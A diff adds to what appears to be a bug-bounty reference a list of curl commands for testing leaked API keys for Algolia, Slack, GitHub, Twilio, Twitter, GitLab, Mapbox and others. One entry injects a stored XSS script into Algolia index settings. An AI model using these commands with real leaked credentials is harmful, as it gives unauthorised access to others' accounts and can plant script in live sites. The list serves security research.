@@ -46,3 +46,74 @@ API key leaks pose significant risks to the security and integrity of applicatio
 * [Saying Goodbye to My Favorite 5 Minute P1](https://www.allysonomalley.com/2020/01/06/saying-goodbye-to-my-favorite-5-minute-p1/) - A good overview of API leaks and how they could be discovered easily
 
 ### Payloads for API Key Vulnerabilities
+
+Below is a listing of some of the known payloads for API keys, if you know of others that I am missing feel free to let me know by creating a ticket or by creating a pull request where you add them yourself.
+
+#### Algolia
+
+```
+curl --request PUT \
+--url https://<application-id>-1.algolianet.com/1/indexes/<example-index>/settings \
+--header 'content-type: application/json' \
+--header 'x-algolia-api-key: <example-key>' \
+--header 'x-algolia-application-id: <example-application-id>' \
+--data '{"highlightPreTag": "<script>alert(1);</script>"}'
+
+```
+
+#### Slack API Token
+```
+curl -sX POST "https://slack.com/api/auth.test?token=xoxp-TOKEN_HERE&pretty=1"
+
+```
+
+#### Facebook Access Token
+
+```
+curl https://developers.facebook.com/tools/debug/accesstoken/?access_token=ACCESS_TOKEN_HERE&version=v3.2
+
+```
+
+#### Github client id and client secret
+
+```
+curl 'https://api.github.com/users/whatever?client_id=xxxx&client_secret=yyyy'
+
+```
+
+#### Twilio Account_sid and Auth Token
+
+```
+curl -X GET 'https://api.twilio.com/2010-04-01/Accounts.json' -u ACCOUNT_SID:AUTH_TOKEN
+
+```
+#### Twitter API Secret
+
+```
+curl -u 'API key:API secret key' --data 'grant_type=client_credentials' 'https://api.twitter.com/oauth2/token'
+
+```
+
+#### Twitter Bearer Token
+
+```
+curl --request GET --url https://api.twitter.com/1.1/account_activity/all/subscriptions/count.json --header 'authorization: Bearer TOKEN'
+
+```
+#### Gitlab Personal Access Token
+
+```
+curl "https://gitlab.example.com/api/v4/projects?private_token=<your_access_token>"
+
+```
+
+#### MapBox API Token
+
+```
+#Check token validity
+curl "https://api.mapbox.com/tokens/v2?access_token=YOUR_MAPBOX_ACCESS_TOKEN"
+
+#Get list of all tokens associated with an account. (only works if the token is a Secret Token (sk), and has the appropiate scope)
+curl "https://api.mapbox.com/tokens/v2/MAPBOX_USERNAME_HERE?access_token=YOUR_MAPBOX_ACCESS_TOKEN"
+
+```
